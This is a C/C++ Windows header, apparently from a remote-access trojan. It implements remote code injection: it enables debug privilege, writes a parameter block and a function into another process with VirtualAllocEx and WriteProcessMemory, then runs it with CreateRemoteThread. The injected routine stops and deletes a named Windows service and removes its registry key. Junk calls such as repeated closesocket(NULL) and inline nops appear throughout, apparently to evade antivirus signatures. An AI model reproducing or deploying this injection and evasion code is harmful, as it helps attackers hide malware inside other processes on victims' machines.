#if !defined(AFX_INJECT_H_INCLUDED)
#define AFX_INJECT_H_INCLUDED

#include <windows.h>
#include <Tlhelp32.h>
extern DWORD GetProcessID(LPCTSTR lpProcessName);

#define THREADSIZE 1024 * 10 //should be big enough

typedef SC_HANDLE	(__stdcall *TOpenSCManager)(LPCTSTR, LPCTSTR, DWORD);
typedef SC_HANDLE	(__stdcall *TOpenService)(SC_HANDLE, LPCTSTR, DWORD);
typedef BOOL		(__stdcall *TQueryServiceStatus)(SC_HANDLE, LPSERVICE_STATUS);
typedef BOOL		(__stdcall *TControlService)(SC_HANDLE, DWORD, LPSERVICE_STATUS);
typedef BOOL		(__stdcall *TStartService)(SC_HANDLE, DWORD, LPCTSTR*);
typedef BOOL		(__stdcall *TDeleteService)(SC_HANDLE);
typedef BOOL		(__stdcall *TCloseServiceHandle)(SC_HANDLE);

typedef DWORD		(__stdcall *TSHDeleteKey)(HKEY, LPCTSTR);

typedef BOOL		(__stdcall	*TCloseHandle)(HANDLE);
typedef VOID		(__stdcall	*TSleep)(DWORD);
typedef BOOL		(__stdcall	*TDeleteFile)(LPCTSTR);


typedef struct
{
	TOpenSCManager		MyOpenSCManager;
	TOpenService		MyOpenService;
	TQueryServiceStatus	MyQueryServiceStatus;
	TControlService		MyControlService;
	TStartService		MyStartService;
	TDeleteService		MyDeleteService;
	TCloseServiceHandle	MyCloseServiceHandle;

	TSHDeleteKey		MySHDeleteKey;

	TCloseHandle		MyCloseHandle;
	TSleep				MySleep;
	TDeleteFile			MyDeleteFile;

	char				strServiceName[100];	// 服务名称
	char				strServiceRegKey[100];	// 服务在注册表中的位置
}REMOTE_PARAMETER, *PREMOTE_PARAMETER;

bool EnableDebugPriv(void)
{
	TCHAR szModule [MAX_PATH];

	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	HANDLE Handle = GetCurrentProcess();
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (!OpenProcessToken(Handle,TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return false;
	closesocket(NULL);
	if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	__asm nop;
	if(!AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,NULL))
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		CloseHandle(hToken);
		return false;
	}
	CloseServiceHandle(hSCM);
	CloseHandle(hToken);

	return true;
}

DWORD __stdcall MyFunc(LPVOID lparam)
{
	TCHAR szModule [MAX_PATH];

	REMOTE_PARAMETER	*pRemoteParam = (REMOTE_PARAMETER *)lparam;
	SC_HANDLE			service = NULL, scm = NULL;
	SERVICE_STATUS		Status;
	__asm nop;
	scm = pRemoteParam->MyOpenSCManager(0, 0,
		SC_MANAGER_CREATE_SERVICE);
	service = pRemoteParam->MyOpenService(
		scm, pRemoteParam->strServiceName,
		SERVICE_ALL_ACCESS | DELETE);
	if (scm==NULL&&service == NULL)
		return -1;

	if (!pRemoteParam->MyQueryServiceStatus(service, &Status))
		return -1;

	if (Status.dwCurrentState != SERVICE_STOPPED)
	{
		if (!pRemoteParam->MyControlService(service, SERVICE_CONTROL_STOP, &Status))
			return -1;
		// Wait to service stopped
		pRemoteParam->MySleep(1000);
	}

	
	// delete service
	pRemoteParam->MyDeleteService(service);
	// delete regkey
	pRemoteParam->MySHDeleteKey(HKEY_LOCAL_MACHINE, pRemoteParam->strServiceRegKey);

	if (service != NULL)
		pRemoteParam->MyCloseServiceHandle(service);
	if (scm != NULL)
		pRemoteParam->MyCloseServiceHandle(scm);
	
	return 0;
}

bool InjectRemoveService(LPCTSTR lpProcessName, char *lpServiceName)
{
	TCHAR szModule [MAX_PATH];

	EnableDebugPriv();
	HANDLE hProcess;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID(lpProcessName));

	if (hProcess == NULL)
		return false;
	//////////////////////////////////////////////////////////////////////////
	REMOTE_PARAMETER	remoteParameter;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	memset(&remoteParameter, 0, sizeof(remoteParameter));

	HMODULE hAdvapi32 = LoadLibrary("advapi32.dll");
	closesocket(NULL);
	remoteParameter.MyOpenSCManager = (TOpenSCManager)GetProcAddress(hAdvapi32, "OpenSCManagerA");
	closesocket(NULL);
	remoteParameter.MyOpenService = (TOpenService)GetProcAddress(hAdvapi32, "OpenServiceA");
	closesocket(NULL);
	remoteParameter.MyQueryServiceStatus = (TQueryServiceStatus)GetProcAddress(hAdvapi32, "QueryServiceStatus");
	closesocket(NULL);
	remoteParameter.MyControlService = (TControlService)GetProcAddress(hAdvapi32, "ControlService");
	closesocket(NULL);
	remoteParameter.MyStartService = (TStartService)GetProcAddress(hAdvapi32, "StartServiceA");
	closesocket(NULL);
	remoteParameter.MyDeleteService = (TDeleteService)GetProcAddress(hAdvapi32, "DeleteService");
	closesocket(NULL);
	remoteParameter.MyCloseServiceHandle = (TCloseServiceHandle)GetProcAddress(hAdvapi32, "CloseServiceHandle");
	closesocket(NULL);
//	FreeLibrary(hAdvapi32);	

	HMODULE	hShlwapi = LoadLibrary("shlwapi.dll");
	closesocket(NULL);
	remoteParameter.MySHDeleteKey = (TSHDeleteKey)GetProcAddress(hShlwapi, "SHDeleteKeyA");
//	FreeLibrary(hShlwapi);

	HMODULE	hKernel32 = LoadLibrary("kernel32.dll");
	closesocket(NULL);
	remoteParameter.MySleep = (TSleep)GetProcAddress(hKernel32, "Sleep");
	closesocket(NULL);
	remoteParameter.MyCloseHandle = (TCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
//	FreeLibrary(hKernel32);
	
	lstrcpy(remoteParameter.strServiceName, lpServiceName);
	closesocket(NULL);
	lstrcpy(remoteParameter.strServiceRegKey, "SYSTEM\\CurrentControlSet\\Services\\");
	closesocket(NULL);
	lstrcat(remoteParameter.strServiceRegKey, remoteParameter.strServiceName);

	//////////////////////////////////////////////////////////////////////////

	// Write thread parameter to Remote thread
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	void *pDataRemote = (char*)VirtualAllocEx(hProcess, 0, sizeof(remoteParameter),
		MEM_COMMIT, PAGE_READWRITE);
	if (!pDataRemote)
		return false;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (!WriteProcessMemory( hProcess, pDataRemote, &remoteParameter, sizeof(remoteParameter), NULL))
		return false;

	// Write Code to Remote thread
	DWORD	cbCodeSize= THREADSIZE; // 分配的空间不大一点，会出错, 过大，WriteProcessMemroy会失败
	closesocket(NULL);
	PDWORD	pCodeRemote = (PDWORD)VirtualAllocEx(hProcess, 0, cbCodeSize, MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if (!pCodeRemote)	
		return false;

	closesocket(NULL);
	if (!WriteProcessMemory(hProcess, pCodeRemote, &MyFunc, cbCodeSize, NULL))
		return false;

	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pCodeRemote, pDataRemote, 0, NULL) == NULL)
	{
		return false;
		CloseServiceHandle(hSCM);
	}
	CloseServiceHandle(hSCM);
	return true;
}	
#endif // !defined(AFX_INJECT_H_INCLUDED)
